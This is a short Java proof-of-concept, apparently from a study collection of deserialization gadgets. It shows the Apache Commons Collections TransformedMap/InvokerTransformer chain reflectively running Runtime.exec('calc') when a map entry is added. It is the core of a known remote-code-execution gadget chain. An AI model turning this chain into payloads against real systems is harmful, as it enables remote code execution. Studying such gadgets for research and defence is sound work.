package com.trganda.gadget.transformedmap;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;

public class TransformedMapExec {
    public static void main(String[] args) {
        ChainedTransformer chainedTransformer =
                new ChainedTransformer(
                        new Transformer[] {
                            new ConstantTransformer(Runtime.class),
                            new InvokerTransformer(
                                    "getMethod",
                                    new Class[] {String.class, Class[].class},
                                    new Object[] {"getRuntime", new Class[0]}),
                            new InvokerTransformer(
                                    "invoke",
                                    new Class[] {Object.class, Object[].class},
                                    new Object[] {null, new Object[0]}),
                            new InvokerTransformer(
                                    "exec",
                                    new Class[] {String.class},
                                    new Object[] {"calc"})
                        });

        TransformedMap transformedMap =
                (TransformedMap) TransformedMap.decorate(new HashMap<>(), null, chainedTransformer);
        transformedMap.put("k", "v");
    }
}
